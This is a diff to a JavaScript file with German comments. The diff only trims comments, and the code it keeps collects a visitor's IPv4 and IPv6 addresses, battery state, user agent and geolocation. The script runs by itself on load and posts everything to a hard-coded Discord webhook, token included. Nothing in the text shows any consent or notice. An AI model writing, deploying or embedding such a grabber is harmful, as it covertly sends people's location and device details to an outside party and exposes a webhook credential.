@@ -1,11 +1,11 @@
 async function sendDataToDiscord() {
     try {
-        // Hole die IPv4-Adresse
+        // IPv4
         const ipv4Response = await fetch('https://api.ipify.org?format=json');
         const ipv4Data = await ipv4Response.json();
         const ipv4Address = ipv4Data.ip;
 
-        // Hole die IPv6-Adresse
+        // IPv6
         const ipv6Response = await fetch('https://api64.ipify.org?format=json');
         const ipv6Data = await ipv6Response.json();
         const ipv6Address = ipv6Data.ip;
@@ -13,17 +13,17 @@ async function sendDataToDiscord() {
         // Bevorzugt IPv4-Adresse
         const addressToSend = ipv4Address || ipv6Address;
 
-        // Batteriestatus abfragen
+        // Batteriestatus
         let batteryStatus = 'Batteriestatus konnte nicht abgefragt werden';
         if ('getBattery' in navigator) {
             const battery = await navigator.getBattery();
             batteryStatus = `Ladezustand: ${Math.round(battery.level * 100)}%, ${battery.charging ? 'Lädt' : 'Nicht ladend'}`;
         }
 
-        // Device-Informationen abfragen
+        // Device-Info
         const deviceInfo = navigator.userAgent;
 
-        // Geolocation abfragen
+        // Geolocation
         let locationInfo = 'Geolocation konnte nicht abgefragt werden';
         let geolocationLink = '';
         if ('geolocation' in navigator) {
@@ -43,13 +43,10 @@ async function sendDataToDiscord() {
             });
         }
 
-        // Warten auf die Geolocation-Antwort
         locationInfo = await locationInfo;
 
-        // Erstelle den Link für mehr Informationen
         const moreInfoLink = `https://whatismyipaddress.com/ip/${ipv4Address}`;
 
-        // Erstelle die Nachricht
         const message = {
             content: `Die IP-Adresse ist: ${addressToSend}\n` +
                      `Batteriestatus: ${batteryStatus}\n` +
@@ -59,10 +56,8 @@ async function sendDataToDiscord() {
                      `[Mehr Informationen](${moreInfoLink})`
         };
 
-        // Discord Webhook URL hier einfügen
         const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1266125230993178710/jAlkmKSYGpKc1ehon3g7aoibKfwsg-Aowu_uUipUambuIXXQ9LFo8bNLR0APME_T4OuO';
 
-        // Sende die Nachricht an Discord
         const discordResponse = await fetch(DISCORD_WEBHOOK_URL, {
             method: 'POST',
             headers: {
@@ -81,5 +76,4 @@ async function sendDataToDiscord() {
     }
 }
 
-// Aufrufen der Funktion
 sendDataToDiscord();
